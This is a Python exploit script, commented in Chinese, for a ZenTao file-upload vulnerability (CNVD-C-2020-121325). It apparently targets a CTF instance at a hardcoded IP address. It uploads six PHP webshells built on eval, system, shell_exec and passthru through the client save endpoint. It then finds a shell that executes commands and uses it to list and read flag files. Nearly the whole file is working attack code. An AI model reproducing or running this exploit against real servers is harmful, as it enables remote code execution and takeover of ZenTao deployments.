#!/usr/bin/env python3
"""
禅道漏洞 - 上传自定义 Webshell 并利用
"""

import requests
import base64

requests.packages.urllib3.disable_warnings()

def upload_webshell():
    base_url = "http://47.113.178.182:32829"

    # 上传不同的 Webshell 变体
    shells = {
        "shell1.php": "<?php @eval($_POST['cmd']);?>",
        "shell2.php": "<?php system($_POST['cmd']);?>",
        "shell3.php": "<?php echo shell_exec($_POST['cmd']);?>",
        "shell4.php": "<?php passthru($_POST['cmd']);?>",
        "test.php": "<?php phpinfo();?>",
        "cmd.php": "<?php if(isset($_POST['c'])){system($_POST['c']);}?>",
    }

    print("[*] 开始上传测试 Webshell...\n")

    uploaded_shells = []

    for filename, shell_code in shells.items():
        # Base64 编码
        encoded_shell = base64.b64encode(shell_code.encode()).decode()

        # 上传 URL
        upload_url = f"{base_url}/zentao/index.php?m=client&f=save&t=txt&fileName={filename}"

        print(f"[*] 上传 {filename}...")
        print(f"    Shell 内容: {shell_code}")

        try:
            # 上传
            resp = requests.post(upload_url, data=encoded_shell, timeout=10)
            print(f"    上传状态: {resp.status_code}")

            # 验证
            shell_url = f"{base_url}/zentao/data/client/1/{filename}"
            check = requests.get(shell_url, timeout=10)

            if check.status_code == 200:
                print(f"    ✓ 上传成功! URL: {shell_url}")
                uploaded_shells.append((filename, shell_url))

                # 如果是 phpinfo，直接查看
                if filename == "test.php":
                    print(f"    响应长度: {len(check.content)} bytes")
                    if len(check.content) > 100:
                        print("    ✓ phpinfo 运行成功!")

            else:
                print(f"    ✗ 验证失败: {check.status_code}")

        except Exception as e:
            print(f"    ✗ 错误: {e}")

        print()

    return uploaded_shells


def test_uploaded_shells(shells):
    """测试上传的 Webshell"""
    if not shells:
        print("[-] 没有成功上传的 Shell")
        return None

    print("\n" + "=" * 70)
    print("测试上传的 Webshell")
    print("=" * 70)

    test_cmd = "echo 'TEST_OK'"

    for filename, url in shells:
        if 'phpinfo' in filename or 'test' in filename:
            continue

        print(f"\n[*] 测试 {filename}: {url}")

        # 根据文件名判断使用的参数
        if 'cmd' in filename or 'shell' in filename:
            param_names = ['cmd', 'c', 'command']
        else:
            param_names = ['cmd', 'c']

        for param in param_names:
            try:
                resp = requests.post(url, data={param: test_cmd}, timeout=10)
                if 'TEST_OK' in resp.text:
                    print(f"    ✓ 成功! 参数名: {param}")
                    return url, param
            except Exception as e:
                pass

    return None, None


def get_flag(shell_url, param_name):
    """获取 Flag"""
    print("\n" + "=" * 70)
    print("开始获取 Flag")
    print("=" * 70)

    # 常见 Flag 位置
    commands = [
        "ls -la /",
        "cat /flag",
        "cat /flag.txt",
        "cat flag.txt",
        "find / -name flag* 2>/dev/null",
        "find / -name *flag* 2>/dev/null | head -10",
    ]

    for cmd in commands:
        print(f"\n[*] 执行: {cmd}")
        try:
            resp = requests.post(shell_url, data={param_name: cmd}, timeout=15)
            if resp.text.strip():
                print("输出:")
                print("-" * 70)
                print(resp.text.strip())
                print("-" * 70)

                # 检查是否包含 flag
                if 'flag{' in resp.text.lower() or 'ctf{' in resp.text.lower():
                    print("\n" + "=" * 70)
                    print("🚩 找到 Flag!")
                    print("=" * 70)
                    return resp.text

        except Exception as e:
            print(f"    错误: {e}")

    return None


def main():
    print("""
╔═══════════════════════════════════════════════════════════════╗
║      禅道 CNVD-C-2020-121325 - 自定义 Webshell 上传利用      ║
╚═══════════════════════════════════════════════════════════════╝
    """)

    # 1. 上传 Webshell
    uploaded = upload_webshell()

    # 2. 测试 Webshell
    if uploaded:
        shell_url, param = test_uploaded_shells(uploaded)

        if shell_url and param:
            print(f"\n[+] 找到可用的 Webshell!")
            print(f"    URL: {shell_url}")
            print(f"    参数: {param}")

            # 3. 获取 Flag
            get_flag(shell_url, param)
        else:
            print("\n[-] 上传的 Webshell 都无法执行命令")
            print("[*] 可能的原因:")
            print("    1. PHP 函数被禁用 (disable_functions)")
            print("    2. 权限不足")
            print("    3. 文件内容被过滤或修改")
    else:
        print("\n[-] 未能成功上传任何 Webshell")


if __name__ == "__main__":
    main()
